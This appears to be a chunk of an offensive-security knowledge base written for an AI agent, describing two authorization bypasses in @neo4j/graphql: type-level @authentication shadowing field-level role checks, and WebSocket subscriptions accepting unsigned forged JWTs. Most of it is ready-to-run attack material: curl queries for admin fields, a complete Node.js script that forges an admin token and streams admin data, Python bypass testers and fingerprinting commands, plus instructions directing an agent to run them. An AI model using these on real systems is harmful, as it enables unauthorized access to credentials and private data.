# GraphQL Directive Authorization Bypass — Agent Chunk 28c
> Source: Deep Internet Research 2026 (Adversarially Verified)
> Purpose: Understand how GraphQL @authentication directive precedence silently weakens security, and how WebSocket subscription connectionParams bypass both authentication and authorization directives
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
When testing GraphQL APIs that use directive-based authorization (@authentication, @authorization, @subscriptionsAuthorization), test for directive precedence conflicts between type-level and field-level annotations. Specifically, check if a type-level @authentication on Query/Mutation types shadows stricter field-level directives. Test subscription endpoints for JWT claim forgery via WebSocket connectionParams without signature verification. Standard GraphQL scanners (InQL, graphql-cop) do NOT test directive precedence logic — this requires manual schema-aware testing.

---

## 1. @authentication Directive Silently Dropped (CVE-2026-19869)

### 1.1 Vulnerability Overview

| Field | Value |
|-------|-------|
| CVE | CVE-2026-19869 |
| CVSS | v4.0 7.6 (High) |
| Affected | @neo4j/graphql >= 5.2.0 |
| Class | CWE-863 (Incorrect Authorization) |

Type-level `@authentication` on root Query/Mutation types SHADOWS stricter field-level directives. Adding MORE security annotations actually WEAKENS security — this is defense-undermining, not defense-in-depth.

### 1.2 Root Cause Analysis

In `@neo4j/graphql`, when the `features.authorization` plugin processes directives, type-level `@authentication` on the root `Query` or `Mutation` type takes precedence over field-level `@authentication` directives. The field-level directive's JWT claim requirements are silently discarded.

**Vulnerable schema pattern:**
```graphql
# Type-level @authentication — requires only a valid JWT (any role)
type Query @authentication {
  
  # Field-level @authentication — requires admin role
  # BUG: This stricter directive is SILENTLY DISCARDED
  adminDashboard: AdminData @authentication(jwt: { roles_INCLUDES: "admin" })
  
  # Field-level @authentication — requires manager role
  # BUG: Also silently discarded
  managerReports: [Report] @authentication(jwt: { roles_INCLUDES: "manager" })
  
  # Public-ish field — only needs valid JWT (type-level suffices)
  publicData: PublicInfo
}
```

**What the developer expects:**
- `publicData`: any valid JWT
- `adminDashboard`: valid JWT with `roles` containing `"admin"`
- `managerReports`: valid JWT with `roles` containing `"manager"`

**What actually happens:**
- ALL fields: any valid JWT (type-level `@authentication` applied uniformly)
- Field-level role requirements are silently ignored

### 1.3 Processing Logic Bug

```javascript
// Simplified @neo4j/graphql directive processing (vulnerable)
function resolveAuthenticationDirective(field, parentType) {
    // Check for type-level directive first
    const typeDirective = getDirective(parentType, 'authentication');
    
    if (typeDirective) {
        // BUG: Type-level directive found — field-level is NOT checked
        // The return here means field-level @authentication is never evaluated
        return typeDirective;
    }
    
    // Field-level directive only checked if NO type-level directive exists
    const fieldDirective = getDirective(field, 'authentication');
    return fieldDirective;
}
```

The correct behavior would be to merge or intersect the requirements — applying the STRICTEST of type-level and field-level directives. Instead, type-level preempts field-level entirely.

### 1.4 Exploitation

**Step 1: Identify the vulnerable pattern in the schema.**

```graphql
# Introspection query to find @authentication directives
{
  __schema {
    queryType {
      name
      fields {
        name
        description
      }
    }
    mutationType {
      name
      fields {
        name
        description
      }
    }
  }
}
```

Note: Directive arguments are not exposed via standard introspection. The attacker infers the pattern from:
- Fields named `admin*`, `manage*`, `internal*` that return restricted data
- API documentation mentioning role-based access
- Error messages revealing directive names

**Step 2: Obtain a basic-role JWT.**

A regular user JWT with no special roles — satisfies the type-level `@authentication` (valid JWT required, no role check):

```json
{
  "sub": "basic-user@example.com",
  "roles": ["viewer"],
  "iss": "https://target.com",
  "exp": 9999999999
}
```

**Step 3: Query admin-restricted fields with the basic JWT.**

```graphql
# This should fail with "Forbidden" for a viewer role
# But succeeds because field-level role check is silently dropped
query {
  adminDashboard {
    totalRevenue
    userCredentials
    systemConfig
    apiKeys
  }
  managerReports {
    employeeSalaries
    performanceReviews
  }
}
```

```bash
curl -X POST https://target.com/graphql \
  -H "Authorization: Bearer ${BASIC_USER_JWT}" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ adminDashboard { totalRevenue userCredentials systemConfig apiKeys } }"}'
# Expected: 200 OK with admin data — field-level role check was silently dropped
```

### 1.5 Reproduction Steps

1. Confirm target uses `@neo4j/graphql` >= 5.2.0 with `features.authorization` enabled
2. Identify fields with field-level `@authentication` that is stricter than type-level (e.g., role requirements)
3. Obtain a JWT that satisfies only the type-level requirement (any valid JWT)
4. Query the fields that should require elevated roles
5. Fields return data — the stricter field-level directive was silently discarded

---

## 2. GraphQL Subscription Auth Bypass via WebSocket connectionParams (CVE-2026-5423)

### 2.1 Vulnerability Overview

| Field | Value |
|-------|-------|
| CVE | CVE-2026-5423 |
| Affected | @neo4j/graphql with subscriptions enabled |
| Class | CWE-287 (Improper Authentication) |

Forged JWT claims in WebSocket `connectionParams` bypass both `@authentication` AND `@subscriptionsAuthorization` directives. No signature verification is performed on the subscription JWT.

### 2.2 Root Cause

When establishing a WebSocket connection for GraphQL subscriptions, the `connectionParams` payload includes a JWT for authentication. The subscription handler extracts claims from this JWT but does not verify its signature. Combined with CVE-2026-19869, this creates a complete bypass path: unauthenticated -> forged claims -> admin access.

**Vulnerable subscription handling:**
```javascript
// Simplified subscription connection handler (vulnerable)
async function onConnect(connectionParams) {
    const token = connectionParams.authorization?.replace('Bearer ', '');
    
    if (token) {
        // BUG: Claims extracted without signature verification
        const decoded = jwt.decode(token);  // decode(), NOT verify()
        
        // Claims used directly for authorization decisions
        return {
            jwt: decoded,
            authenticated: true
        };
    }
    
    throw new Error('Missing authentication');
}
```

The critical distinction: `jwt.decode()` extracts claims without any cryptographic verification, while `jwt.verify()` validates the signature. Using `decode()` means any crafted token with arbitrary claims will be accepted.

### 2.3 Exploitation

**Step 1: Connect via WebSocket with forged JWT.**

```javascript
const WebSocket = require('ws');

// Craft a JWT with admin claims — no valid signature needed
const forgedHeader = btoa(JSON.stringify({ alg: "HS256", typ: "JWT" }));
const forgedPayload = btoa(JSON.stringify({
    sub: "admin@target.com",
    roles: ["admin", "superuser"],
    permissions: ["*"],
    iss: "https://target.com",
    exp: 9999999999
}));
const forgedToken = `${forgedHeader}.${forgedPayload}.fake-signature`;

// WebSocket connection with forged JWT in connectionParams
const ws = new WebSocket('wss://target.com/graphql', 'graphql-ws', {
    headers: {
        'Sec-WebSocket-Protocol': 'graphql-ws'
    }
});

ws.on('open', () => {
    // Connection init with forged JWT
    ws.send(JSON.stringify({
        type: 'connection_init',
        payload: {
            authorization: `Bearer ${forgedToken}`
        }
    }));
});

ws.on('message', (data) => {
    const msg = JSON.parse(data);
    
    if (msg.type === 'connection_ack') {
        // Connection accepted — forged claims trusted
        // Subscribe to admin-only data stream
        ws.send(JSON.stringify({
            id: '1',
            type: 'start',
            payload: {
                query: `subscription {
                    adminNotifications {
                        type
                        message
                        sensitiveData
                        userCredentials
                    }
                }`
            }
        }));
    }
    
    if (msg.type === 'data') {
        console.log('ADMIN DATA RECEIVED:', JSON.stringify(msg.payload, null, 2));
    }
});
```

**Step 2: Combined with CVE-2026-19869 for full bypass.**

```
Unauthenticated attacker
    -> Craft JWT with arbitrary admin claims (no valid signature)
    -> WebSocket connectionParams accepts forged JWT (CVE-2026-5423)
    -> Claims extracted without signature verification
    -> Type-level @authentication satisfied (valid-looking JWT)
    -> Field-level @subscriptionsAuthorization silently dropped (CVE-2026-19869)
    -> Admin subscription data streams to attacker in real-time
```

### 2.4 Reproduction Steps

1. Confirm target uses `@neo4j/graphql` with subscriptions enabled (WebSocket endpoint)
2. Craft a JWT with admin claims and any arbitrary signature
3. Establish WebSocket connection to the GraphQL subscription endpoint
4. Send `connection_init` with the forged JWT in `connectionParams`
5. Server decodes JWT without signature verification, trusts claims
6. Subscribe to admin-only subscription fields
7. Real-time admin data streams to the attacker

---

## 3. Schema-Aware Testing Methodology

### 3.1 Directive Conflict Detection

```python
def test_directive_precedence(target, schema):
    """Test for @authentication directive precedence bugs."""
    
    # Step 1: Identify types with type-level @authentication
    types_with_auth = find_types_with_directive(schema, 'authentication')
    
    for type_name, type_def in types_with_auth.items():
        # Step 2: Find fields with STRICTER field-level @authentication
        for field in type_def.fields:
            field_auth = get_directive(field, 'authentication')
            type_auth = get_directive(type_def, 'authentication')
            
            if field_auth and has_stricter_requirements(field_auth, type_auth):
                print(f"POTENTIAL DIRECTIVE CONFLICT: {type_name}.{field.name}")
                print(f"  Type-level: {type_auth}")
                print(f"  Field-level: {field_auth}")
                
                # Step 3: Test with JWT satisfying ONLY type-level
                basic_jwt = create_jwt_for_requirements(type_auth)
                result = query_field(target, type_name, field.name, basic_jwt)
                
                if result.success:
                    print(f"  CONFIRMED: Field-level directive SILENTLY DROPPED")
                    print(f"  Admin data accessible with basic JWT")
```

### 3.2 Subscription Authentication Testing

```python
def test_subscription_auth_bypass(ws_endpoint):
    """Test WebSocket subscription JWT verification."""
    
    test_tokens = [
        ("unsigned_jwt", craft_unsigned_jwt(admin_claims)),
        ("wrong_signature", craft_jwt_wrong_sig(admin_claims)),
        ("expired_forged", craft_expired_jwt(admin_claims)),
        ("none_alg", craft_none_alg_jwt(admin_claims)),
    ]
    
    for name, token in test_tokens:
        try:
            ws = connect_websocket(ws_endpoint)
            ws.send(json.dumps({
                "type": "connection_init",
                "payload": {"authorization": f"Bearer {token}"}
            }))
            response = ws.recv()
            msg = json.loads(response)
            
            if msg.get("type") == "connection_ack":
                print(f"SUBSCRIPTION AUTH BYPASS ({name}): connection accepted")
                
                # Try subscribing to sensitive data
                ws.send(json.dumps({
                    "id": "1",
                    "type": "start",
                    "payload": {"query": "subscription { adminNotifications { message } }"}
                }))
                
                sub_response = ws.recv()
                print(f"  Subscription response: {sub_response}")
            else:
                print(f"  {name}: connection rejected (secure)")
                
        except Exception as e:
            print(f"  {name}: error - {e}")

### 3.3 Scanner Limitations

# Standard GraphQL scanners do NOT test for these issues:
# - InQL: Focuses on introspection, query complexity, batch attacks
# - graphql-cop: Tests for common misconfigs (introspection, field suggestions)
# - Neither tests directive precedence logic or subscription auth
# - Manual schema-aware testing is REQUIRED for directive conflict bugs

# Recommended manual testing checklist:
# 1. Extract full schema (introspection or schema stitching)
# 2. Map all @authentication/@authorization directives
# 3. Identify type-level vs field-level directive conflicts
# 4. Test each conflict with minimal-privilege JWT
# 5. Test subscription endpoints with unsigned/forged JWTs
# 6. Test @subscriptionsAuthorization directive separately
```

### 3.4 Identifying Vulnerable Deployments

```bash
# Fingerprint @neo4j/graphql
# Look for Neo4j-specific error messages
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __typename }"}' 2>&1 | grep -i "neo4j"

# Check for subscription endpoint (WebSocket)
curl -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGVzdA==" \
  -H "Sec-WebSocket-Protocol: graphql-ws" \
  https://target.com/graphql

# Check for graphql-ws or subscriptions-transport-ws protocol
# A 101 Switching Protocols response indicates WebSocket subscriptions are enabled
```
